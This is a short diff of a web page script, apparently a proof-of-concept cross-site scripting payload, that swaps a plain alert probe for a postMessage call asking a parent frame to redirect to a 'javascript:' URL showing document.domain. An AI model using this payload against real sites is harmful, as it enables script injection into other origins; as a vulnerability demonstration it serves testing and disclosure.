@@ -1,1 +1,3 @@
-<script>alert(0)</script>
+<script>
+  parent.postMessage({  action: "requestRedirectionTo",  targetUrlStr: "javascript:alert(document.domain)" }, "*");
+</script>
